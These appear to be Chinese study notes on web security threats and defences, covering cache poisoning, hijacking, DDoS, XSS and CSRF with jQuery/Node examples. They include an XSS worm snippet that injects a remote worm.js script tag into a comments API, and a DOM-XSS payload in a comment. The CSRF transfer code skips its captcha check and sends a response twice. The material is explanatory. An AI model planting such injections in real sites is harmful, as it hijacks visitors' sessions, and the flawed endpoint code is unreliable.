### 1、恶意网站拦截 ###
* 浏览器周期性的从服务端获取一份最新的恶意网站黑名单，如果，用户上网时访问的网址存在于此黑名单中，浏览器会弹出一个警告页面。
* 解决办法：工信部投诉        

### 2、缓存投毒 ###
* 免费的WiFi，欢迎页，偷偷请求好多网站，访问A站时，加载了b站的通用脚本jq/bs(内含恶意脚本)，由于大部分网站有缓存静态文件（jq,bootstrap）的时间较长。离开免费WiFi后，再次请求A站时候，就会触发jq中含有的恶意代码。
* 解决办法：尽量不用；清除缓存。    
### 3、文件投毒 ###
* 下载非官方的插件（jq）;官方下载地址被攻击；不可信的第三方cdn资源。
* 解决办法：自己擦亮眼睛  
### 4、客户端投毒 ###  
* chrome 安装了恶意的插件
* 解决办法：密码防止装库，手机验证码  
### 5、网页劫持 ###
* 本机的hosts文件被篡改,映射被改了、190.208.173.191 preok.com
* 公网的dns被解析到另一个恶意网站。
 * 脚本被篡改，比如jq引用其它网站的包。
* 解决办法：升级https。
### 6、DDOS攻击（distribute denial of service） ###   
 * 黑客控制大量肉鸡（别人ip，不同IP）发送非正常请求，
 * 向主机服务器频繁发送非正常请求，
 * 解决办法：没有有效的方法。1、验证码,2、限制请求频率、3、增加服务宽带（增加并发量，双11）、4、负载均衡分布式服务(不同区域不同服务器)、5、买些高仿IP（太贵）  
### 7、xss+csrf 儒虫 ### 
* 儒虫 有人引爆它，让它触发，比如
    ```
    // 将一个请求接口脚本 存到服务器，
    // 比如：下边评论功能，将评论内容发到数据库，每次有人=看的时候就自动提交一次。越来越多。
    const attack = '<script src="http://localhost:3001/worm.js"></script>';
    $.post('/api/comments', { content: 'haha' + attack });
    ```
### 8、HTTP劫持 ###  
* 客户端与服务器二者建立了通道，中间被劫持，也可能是运营商加个广告、
* 解决办法：https

### 9、自身安全漏洞问题 ###    
    
* 1、跨站脚本攻击（XSS）
    * 含义：cross site script,避免和css重复、所以叫 ‘XSS’,往网页里注入恶意的脚本代码，当用户访包含恶意脚本的代码时候，通过恶意脚本，黑客可以获取和控制用户信息。
    * 反射型（发给服务器返回）：引导用户点击链接，
        * 解决办法：httpOnly浏览器禁止页面的js访问带有HttpOnly属性的Cookie；谷歌浏览器做了大部分拦截；需要encodeURI和encodeURIComponent联合使用。
    * 存储型：恶意的脚本存储到服务器。
        * 解决办法：输入检测（过滤js脚本），输出检测（编码火转移）;需要encodeURI和encodeURIComponent联合使用;[html转义](http://www.w3school.com.cn/html/html_entities.asp);js转义（“e” 编码为“\145”），前端展示用函数（类库）转义下。
    * DOM-Based型XSS。不需要服务端参与，是由于DOM结构修改导致的，基于浏览器DOM解析的攻击。
    浏览器在DOM解析的时候直接使用恶意数据，常见的触发场景就是在修改innerHTML outerHTML document.write的时候。
       * 解决办法，过滤输入
       
    ```
        DOM-Based
        <body>
        <h1>输入链接地址，然后点击按钮</h1>
        <div id="content"></div>
        <input type="text" id="link">
        <button onclick="setup()">设置</button>
        <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
        <script>
            function setup() {
                // " onclick=alert(1) //
                let html = `<a href="${$('#link').val()}">点我</a>`;
                $('#content').html(html);
            }
        </script>
        </body>
    ```
    
    * payload XSS。窃取用户的Cookie，识别浏览器，钓鱼链接让用户访问假冒网站。
* 2、跨站请求伪造CSRF（Cross-site request forgery） 
    * 含义：跨站点请求伪造。  用户A登录银行网站，登录成功后会设置cookie，黑客诱导用户A登录到黑客的站点，然后会返回一个页面 ，用户访问这个页面时，这个页面会伪造一个转账请求到银行网站。
    * 解决办法1 验证码（影响用户体验） 类库（svgCaptcha），刷新的时候后端生成验证码发送给前端，前端保存到session（或者仅仅显示）中，请求的时候带过去（参数），相同服务端就返回，否则就拒绝。
    
    ```
    <div class="form-group">
        <label for="captcha" id="captcha"></label>
        <input id="captcha" class="form-control" placeholder="请输入验证码">
    </div>
    
    
     $.get('/api/captcha').then(data => {
        if (data.code == 0) {
            $('#captcha').html(data.captcha);
        } else {
            alert('用户未登录');
            location.href = '/login.html';
        }
    });
        var svgCaptcha = require('svg-captcha');
    app.get('/api/captcha', function (req, res) {
        let session = userSessions[req.cookies.sessionId];
        if (session) {
            var codeConfig = {
                size: 5,// 验证码长度
                ignoreChars: '0o1i', // 验证码字符中排除 0o1i
                noise: 2, // 干扰线条的数量
                height: 44
            }
            var captcha = svgCaptcha.create(codeConfig);
            session.captcha = captcha.text.toLowerCase(); //存session用于验证接口获取文字码
            res.send({ code: 0, captcha: captcha.data });
        } else {
            res.json({ code: 1, data: '没有该用户' });
        }
    });
    
    ```
    
    * 解决办法2、refer验证（不可靠）
    
     ```
      let referer = req.headers['referer'];
        if (/^https?:\/\/localhost:3000/.test(referer)) {
    
        } else {
            res.json({ code: 1, error: 'referer不正确' });
        }
     ```
     * 解决办法3 token验证（推荐）服务端生成token传给浏览器，交互的时候，判断是否相同。token有很多种生成方式，比如cookie或者sessionId,规则前后端双方约定好。 不容易被伪造，一次性的，
     
     ```
     function getClientToken() {
            let result = document.cookie.match(/token=([^;]+)/);
            return result ? result[1] : '';
        }
    function transfer(event) {
                event.preventDefault();
                let target = $('#target').val();
                let amount = $('#amount').val();
                let captcha = $('#captcha').val();
                $.post('/api/transfer', {
                    target,
                    amount,
                    captcha,
                    clientToken: getClientToken()
                }).then(data => {
                    if (data.code == 0) {
                        alert('转账成功');
                        location.reload();
                    } else {
                        alert('用户未登录');
                        location.href = '/login.html';
                    }
                });
    }
         app.post('/api/transfer', function (req, res) {
        // let referer = req.headers['referer'];
        //if (/^https?:\/\/localhost:3000/.test(referer)) {
        let { target, amount, clientToken, captcha } = req.body;
        amount = isNaN(amount) ? 0 : Number(amount);
        let { username, token } = userSessions[req.cookies.sessionId];
        if (username) {
            if (clientToken == token) {
                let user;
                for (let i = 0; i < users.length; i++) {
                    if (username == users[i].username) {
                        users[i].money -= amount;
                    } else if (target == users[i].username) {
                        users[i].money += amount;
                    }
                }
                res.json({ code: 0 });
            } else {
                res.json({ code: 1, error: '违法操作' });
            }
        } else {
            res.json({ code: 1, error: '用户没有登录' });
        }
        //} else {
        res.json({ code: 1, error: 'referer不正确' });
        //}
    })
     ```
 
